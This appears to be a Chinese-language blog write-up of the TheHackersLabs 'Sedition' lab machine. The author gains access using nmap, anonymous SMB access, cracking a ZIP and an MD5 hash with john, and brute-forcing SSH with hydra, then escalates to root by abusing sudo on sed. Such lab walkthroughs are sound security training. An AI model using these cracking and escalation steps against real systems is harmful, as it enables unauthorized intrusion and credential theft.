{"pageProps":{"postData":{"id":"TheHackersLabsSedition","contentHtml":"<h1>Sedition</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/117\">https://labs.thehackerslabs.com/machine/117</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsSedition/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<pre><code class=\"hljs language-bash\">➜  Sedition nmap -sT -min-rate 10000 192.168.56.87      \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:30 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.87\nHost is up (0.0037s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT    STATE SERVICE\n139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds\nMAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 13.32 seconds\n</code></pre>\n<p>扫描出来是非常规端口</p>\n<pre><code class=\"hljs language-bash\">➜  Sedition nmap -sT -A -p 139,445 192.168.56.87        \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:34 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.87\nHost is up (0.00049s latency).\n\nPORT    STATE SERVICE     VERSION\n139/tcp open  netbios-ssn Samba smbd 4\n445/tcp open  netbios-ssn Samba smbd 4\nMAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\n\nHost script results:\n|_clock-skew: -3s\n| smb2-time: \n|   <span class=\"hljs-built_in\">date</span>: 2025-07-14T13:34:54\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n|_nbstat: NetBIOS name: SEDITION, NetBIOS user: &#x3C;unknown>, NetBIOS MAC: &#x3C;unknown> (unknown)\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.49 ms 192.168.56.87\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 26.50 seconds\n</code></pre>\n<p>没有<code>Web</code>端口，我们只能从<code>SMB</code>上手</p>\n<p>首先尝试使用匿名账户进行访问</p>\n<pre><code class=\"hljs language-bash\">➜  Sedition smbclient -L 192.168.56.87 -U anonymous\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\anonymous]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        <span class=\"hljs-built_in\">print</span>$          Disk      Printer Drivers\n        backup          Disk      \n        IPC$            IPC       IPC Service (Samba Server)\n        nobody          Disk      Home Directories\nReconnecting with SMB1 <span class=\"hljs-keyword\">for</span> workgroup listing.\nsmbXcli_negprot_smb1_done: No compatible protocol selected by server.\nProtocol negotiation to server 192.168.56.87 (<span class=\"hljs-keyword\">for</span> a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE\nUnable to connect with SMB1 -- no workgroup available\n</code></pre>\n<p><code>backup</code>里面有一个压缩包，下载</p>\n<p><img src=\"/post-images/TheHackersLabsSedition/image1.png\" alt=\"image.png\"></p>\n<h2>ZIP Crack</h2>\n<p>解压压缩包需要密码</p>\n<pre><code class=\"hljs language-bash\">➜  Sedition unzip secretito.zip  \nArchive:  secretito.zip\n[secretito.zip] password password: \n   skipping: password                incorrect password\n</code></pre>\n<p><code>john</code>转换后爆破</p>\n<pre><code class=\"hljs language-bash\">➜  Sedition zip2john secretito.zip > ziphash.txt                                 \nver 1.0 efh 5455 efh 7875 secretito.zip/password PKZIP Encr: 2b chk, TS_chk, cmplen=34, decmplen=22, crc=F2E5967A ts=969D cs=969d <span class=\"hljs-built_in\">type</span>=0\n\n➜  Sedition john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt         \nUsing default input encoding: UTF-8\nLoaded 1 password <span class=\"hljs-built_in\">hash</span> (PKZIP [32/64])\nWill run 8 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\nsebastian        (secretito.zip/password)     \n1g 0:00:00:00 DONE (2025-07-14 21:40) 50.00g/s 819200p/s 819200c/s 819200C/s 123456..cocoliso\nUse the <span class=\"hljs-string\">\"--show\"</span> option to display all of the cracked passwords reliably\nSession completed.\n</code></pre>\n<p>解压后得到一个密码 <code>elbunkermolagollon123</code></p>\n<p><img src=\"/post-images/TheHackersLabsSedition/image2.png\" alt=\"image.png\"></p>\n<p>这里尝试了很多用户名尝试登录<code>SMB</code>，但是都是失败了</p>\n<h2>端口扫描 v2</h2>\n<p>再枚举一下端口</p>\n<p>UDP</p>\n<pre><code class=\"hljs language-bash\">➜  Sedition nmap -sU -min-rate 5000 192.168.56.87\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:46 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.87\nHost is up (0.00022s latency).\nNot shown: 993 open|filtered udp ports (no-response)\nPORT      STATE  SERVICE\n137/udp   open   netbios-ns\n5353/udp  closed zeroconf\n17845/udp closed unknown\n25375/udp closed unknown\n41702/udp closed unknown\n46093/udp closed unknown\n51456/udp closed unknown\nMAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 13.74 seconds\n</code></pre>\n<p>TCP 所有端口</p>\n<pre><code class=\"hljs language-bash\">➜  Sedition nmap -sT -min-rate 10000 -p- 192.168.56.87\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:48 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.87\nHost is up (0.00037s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n65535/tcp open  unknown\nMAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 17.75 seconds\n</code></pre>\n<p>多了个 <code>65535</code> ，扫描一下详细信息</p>\n<pre><code class=\"hljs language-bash\">➜  Sedition nmap -sT -A -p 65535 192.168.56.87\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:50 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.87\nHost is up (0.00040s latency).\n\nPORT      STATE SERVICE VERSION\n65535/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)\n| ssh-hostkey: \n|   256 32:ca:e5:d1:12:c2:1e:11:1e:58:43:32:a0:dc:03:ab (ECDSA)\n|_  256 79:3a:80:50:61:d9:96:34:e2:db:d6:1e:65:f0:a9:14 (ED25519)\nMAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.41 ms 192.168.56.87\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 15.32 seconds\n</code></pre>\n<p>Ohya？SSH，<code>hydra</code>爆破一下用户名</p>\n<pre><code class=\"hljs language-bash\">hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  -p elbunkermolagollon123 -t 12 -s 65535 -Vv 192.168.56.87 ssh  \n</code></pre>\n<p>得到用户名 <code>cowboy</code></p>\n<p><img src=\"/post-images/TheHackersLabsSedition/image3.png\" alt=\"image.png\"></p>\n<h2>权限提升</h2>\n<h3>In cowboy shell</h3>\n<p>查看<code>sudo</code>权限</p>\n<pre><code class=\"hljs language-bash\">cowboy@Sedition:~$ <span class=\"hljs-built_in\">sudo</span> -l\n[<span class=\"hljs-built_in\">sudo</span>] contraseña para cowboy: \nSorry, user cowboy may not run <span class=\"hljs-built_in\">sudo</span> on sedition.\n</code></pre>\n<p>寻找<code>sid</code>权限文件</p>\n<pre><code class=\"hljs language-bash\">cowboy@Sedition:~$ find / -perm -u=s -<span class=\"hljs-built_in\">type</span> f 2>/dev/null\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/umount\n/usr/bin/chfn\n/usr/bin/su\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/mount\n</code></pre>\n<p>突然注意到<code>.bash_history</code> 没有被重定向到 <code>/dev/null</code></p>\n<pre><code class=\"hljs language-bash\">cowboy@Sedition:~$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 24\ndrwx------ 2 cowboy cowboy 4096 jul  6 20:08 .\ndrwxr-xr-x 4 root   root   4096 jul  6 18:56 ..\n-rw------- 1 cowboy cowboy   78 jul 14 16:09 .bash_history\n-rw-r--r-- 1 cowboy cowboy  220 jul  6 18:56 .bash_logout\n-rw-r--r-- 1 cowboy cowboy 3526 jul  6 18:56 .bashrc\n-rw-r--r-- 1 cowboy cowboy  807 jul  6 18:56 .profile\ncowboy@Sedition:~$ <span class=\"hljs-built_in\">cat</span> .bash_history \n<span class=\"hljs-built_in\">history</span>\n<span class=\"hljs-built_in\">exit</span>\nmariadb\nmariadb -u cowboy -pelbunkermolagollon123\nsu debian\n<span class=\"hljs-built_in\">exit</span>\n</code></pre>\n<p>扒拉 <code>users</code> 表</p>\n<pre><code class=\"hljs language-bash\">MariaDB [bunker]> <span class=\"hljs-keyword\">select</span> * from <span class=\"hljs-built_in\">users</span>;\n+--------+----------------------------------+\n| user   | password                         |\n+--------+----------------------------------+\n| debian | 7c6a180b36896a0a8c02787eeafb0e4c |\n+--------+----------------------------------+\n1 row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (0,000 sec)\n</code></pre>\n<p>爆破密码</p>\n<pre><code class=\"hljs language-bash\">➜  Sedition john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 <span class=\"hljs-built_in\">hash</span> \nUsing default input encoding: UTF-8\nLoaded 1 password <span class=\"hljs-built_in\">hash</span> (Raw-MD5 [MD5 256/256 AVX2 8x3])\nWarning: no OpenMP support <span class=\"hljs-keyword\">for</span> this <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-built_in\">type</span>, consider --fork=8\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\npassword1        (?)     \n1g 0:00:00:00 DONE (2025-07-14 22:17) 100.0g/s 38400p/s 38400c/s 38400C/s 123456..michael1\nUse the <span class=\"hljs-string\">\"--show --format=Raw-MD5\"</span> options to display all of the cracked passwords reliably\nSession completed. \n</code></pre>\n<h3>In debian shell</h3>\n<p>当前用户家目录下能拿到 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">debian@Sedition:~$ <span class=\"hljs-built_in\">cat</span> flag.txt \npixxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<p><code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">debian@Sedition:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> debian on sedition:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser debian may run the following commands on sedition:\n    (ALL) NOPASSWD: /usr/bin/sed\n</code></pre>\n<p>结束：<a href=\"https://gtfobins.github.io/gtfobins/sed/\">https://gtfobins.github.io/gtfobins/sed/</a></p>\n<p><img src=\"/post-images/TheHackersLabsSedition/image4.png\" alt=\"image.png\"></p>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># cat root.txt</span>\nlaxxxxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>总结</h2>\n<p>超级常规</p>","title":"TheHackersLabs - Sedition","date":"2025-07-14","updated":"2025-07-14","tags":["TheHackersLabs","Linux","SMB","ZIPcrack","sed"],"categories":"靶机","comments":true,"description":"Sedition\n\n https://labs.thehackerslabs.com/machine/117\n \n\n\n\nRecon\n\n\n\n扫描出来是非常规端口\n\n\n\n没有`Web`端口，我们只能从`SMB`上手\n\n首先尝试使用匿名账户进行访问\n\n\n\n`backup`里面有一个压缩包，下载\n\n\n\nZIP Crack\n\n解压压缩包需要密码\n\n\n\n`john`转换后爆破\n\n\n\n解压后得到一个密码 `el..."},"recentPosts":[{"id":"HackMyVMSilentdev","title":"HackMyVM - Silentdev","date":"2025-09-26","isEncrypted":false,"year":"2025","month":"09","day":"26"},{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"},{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"HackTheBoxSeason8 - Fluffy","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Planning","title":"HackTheBox - Machine - Planning","date":"2025-05-11","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Eureka","title":"HackTheBox - Machine - Eureka","date":"2025-04-28","isEncrypted":false,"year":"2025","month":"09","day":"20"}]},"__N_SSG":true}